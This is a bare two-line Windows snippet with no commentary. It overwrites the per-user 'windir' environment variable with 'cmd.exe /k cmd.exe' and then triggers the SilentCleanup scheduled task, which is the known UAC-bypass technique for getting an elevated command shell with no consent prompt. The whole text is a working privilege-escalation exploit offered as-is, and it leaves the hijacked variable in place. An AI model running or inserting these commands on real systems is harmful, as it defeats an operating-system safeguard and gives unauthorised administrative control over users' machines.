New-ItemProperty "HKCU:\Environment" -Name "windir" -Value "cmd.exe /k cmd.exe" -PropertyType String -Force
schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
    